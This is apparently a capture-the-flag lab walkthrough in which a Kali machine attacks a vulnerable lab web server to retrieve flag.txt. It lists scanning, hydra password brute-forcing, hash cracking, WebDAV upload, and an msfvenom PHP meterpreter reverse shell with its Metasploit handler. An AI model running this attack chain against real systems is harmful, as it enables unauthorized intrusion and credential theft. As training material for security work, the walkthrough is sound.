### Red Team 
In this activity, you will use a Kali instance to hack into a vulnerable web server. Hidden in the web server is a file called `flag.txt`. You will need to use a reverse php shell to gain access to the web server to recover the `flag.txt` document. 

**Part 1: Red Team Objectives**
Complete the following in order to find the flag:
- Discover the IP address of the Linux server.
```
netdiscover
```
<img src="images/red-01.png" />

```
Db_nmap 172.16.84.205 -Pn -p-
```
<img src="images/red-02.png" />

```
Db_nmap 172.16.84.205 -A
```
<img src="images/red-03.png" />

```
Nikto --host http://172.16.84.205
```
<img src="images/red-04.png" />
<img src="images/red-05.png" />

```
printf “GET / HTTP/1.0\r\n\r\n” | nc 172.16.84.205 80 | less
```
<img src="images/red-06.png" />

- Use Burp Suite to generate a sitemap by manually browsing the site.
<img src="images/red-07.png" />

- Use Burp Spider to expand your sitemap.
<img src="images/red-08.png" />

- Locate the hidden directory on the server.
company_folders/secret_folder
<img src="images/red-09.png" />

- Brute force the password for the hidden directory.
<img src="images/red-10.png" />

```
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 172.16.84.205 http-get /company_folders/secret_folder/
```
<img src="images/red-11.png" />
<img src="images/red-12.png" />

- Break the hash password with John the Ripper
<img src="images/red-13.png" />

- Connect to the server via Webdav.
<img src="images/red-14.png" />

- Generating a reverse shell with msfvenom.
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.84.55 LPORT=6666 -f raw -or evil.php
```
<img src="images/red-15.png" />

- Upload a reverse php connection payload.
<img src="images/red-16.png" />

```
msf > use multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.84.55
LHOST => 172.16.84.55
msf exploit(handler) > set LPORT 6666
LPORT => 6666
msf exploit(handler) > exploit
```

- Capture and show the flag.
<img src="images/red-17.png" />
